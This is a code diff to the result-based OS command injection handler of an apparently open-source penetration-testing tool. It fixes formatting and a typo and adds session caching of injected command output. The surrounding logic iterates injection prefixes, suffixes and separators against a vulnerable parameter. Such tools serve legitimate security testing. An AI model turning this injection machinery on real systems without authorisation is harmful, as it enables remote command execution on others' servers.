@@ -67,7 +67,6 @@ The "classic" technique on result-based OS command injection.
 The "classic" injection technique handler.
 """
 def cb_injection_handler(url, delay, filename, http_request_method):
-  
   counter = 1
   vp_flag = True
   no_result = True
@@ -87,9 +86,9 @@ def cb_injection_handler(url, delay, filename, http_request_method):
     for prefix in settings.PREFIXES:
       for suffix in settings.SUFFIXES:
         for separator in settings.SEPARATORS:
-
+          
           # If a previous session is available.
-          if settings.LOAD_SESSION and session_handler. notification(url, technique):
+          if settings.LOAD_SESSION and session_handler.notification(url, technique):
             url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
 
           else:
@@ -367,16 +366,20 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                     else:
                       # Command execution results.
                       response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-                      
                       # if need page reload
                       if menu.options.url_reload:
                         time.sleep(delay)
                         response = urllib.urlopen(url)
-                        
-                      # Evaluate injection results.
-                      shell = cb_injector.injection_results(response, TAG)
-                      if shell:
+                      if menu.options.ignore_session or \
+                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+                        # Evaluate injection results.
+                        shell = cb_injector.injection_results(response, TAG)
                         shell = "".join(str(p) for p in shell)
+                        if not menu.options.ignore_session :
+                          session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+                      else:
+                        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+                      if shell:
                         html_parser = HTMLParser.HTMLParser()
                         shell = html_parser.unescape(shell)
                         if shell != "":
